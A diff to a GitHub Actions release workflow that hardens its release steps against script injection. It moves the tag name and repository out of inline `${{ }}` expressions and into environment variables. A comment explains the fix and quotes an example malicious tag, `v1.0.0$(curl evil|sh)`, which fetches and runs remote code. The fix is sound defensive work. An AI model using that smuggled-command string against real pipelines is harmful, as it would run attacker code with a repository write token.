@@ -110,11 +110,22 @@ jobs:
       # continuation in a `.github/workflows/` command as a Windows assumption,
       # and this job's shell is `bash` on a `windows-latest` runner precisely so
       # it stays portable — a real backslash would be exactly backwards here.
+      # `TAG_NAME`/`REPO` go through `env:`, never spliced into `run:` directly.
+      # A git tag name may legally contain `$()`, backticks, `;` and `"` — Actions
+      # substitutes `${{ github.ref_name }}` into this YAML's text before bash
+      # ever parses it, so a tag like `v1.0.0$(curl evil|sh)` (still a valid ref,
+      # still matches this workflow's `v*` trigger) would have run arbitrary code
+      # in a step holding a `contents: write` GH_TOKEN, had the expression been
+      # quoted straight into the shell string instead. An environment variable's
+      # *value* is never re-parsed for shell syntax, so `"$TAG_NAME"` is safe
+      # regardless of what the tag name contains.
       - name: Create draft release
         env:
           GH_TOKEN: ${{ github.token }}
+          TAG_NAME: ${{ github.ref_name }}
+          REPO: ${{ github.repository }}
         shell: bash
-        run: gh release create "${{ github.ref_name }}" --draft --title "${{ github.ref_name }}" --notes "Draft release for ${{ github.ref_name }}, packaged by .github/workflows/release.yml. Unsigned unless D-25's signing identity is configured, verify with the platform's own tool per docs/RELEASE.md section 2.3, not by the absence of a warning in this build log. Publishing this draft is a human step (docs/RELEASE.md section 2.4)." --repo "${{ github.repository }}"
+        run: gh release create "$TAG_NAME" --draft --title "$TAG_NAME" --notes "Draft release for $TAG_NAME, packaged by .github/workflows/release.yml. Unsigned unless D-25's signing identity is configured, verify with the platform's own tool per docs/RELEASE.md section 2.3, not by the absence of a warning in this build log. Publishing this draft is a human step (docs/RELEASE.md section 2.4)." --repo "$REPO"
 
       # THE INSTALLER AND ITS BLOCKMAP, FIRST. RELEASE.md section 2.4: the
       # blockmap is what makes a differential update possible, and uploading it
@@ -123,8 +134,10 @@ jobs:
       - name: Upload installer and blockmap
         env:
           GH_TOKEN: ${{ github.token }}
+          TAG_NAME: ${{ github.ref_name }}
+          REPO: ${{ github.repository }}
         shell: bash
-        run: gh release upload "${{ github.ref_name }}" release/*.exe release/*.blockmap --repo "${{ github.repository }}" --clobber
+        run: gh release upload "$TAG_NAME" release/*.exe release/*.blockmap --repo "$REPO" --clobber
 
       # `latest.yml` LAST, AND ONLY AFTER THE ABOVE SUCCEEDED. RELEASE.md
       # section 2.4: this is the file electron-updater reads to decide an update
@@ -135,5 +148,7 @@ jobs:
       - name: Upload the update manifest
         env:
           GH_TOKEN: ${{ github.token }}
+          TAG_NAME: ${{ github.ref_name }}
+          REPO: ${{ github.repository }}
         shell: bash
-        run: gh release upload "${{ github.ref_name }}" release/latest.yml --repo "${{ github.repository }}" --clobber
+        run: gh release upload "$TAG_NAME" release/latest.yml --repo "$REPO" --clobber
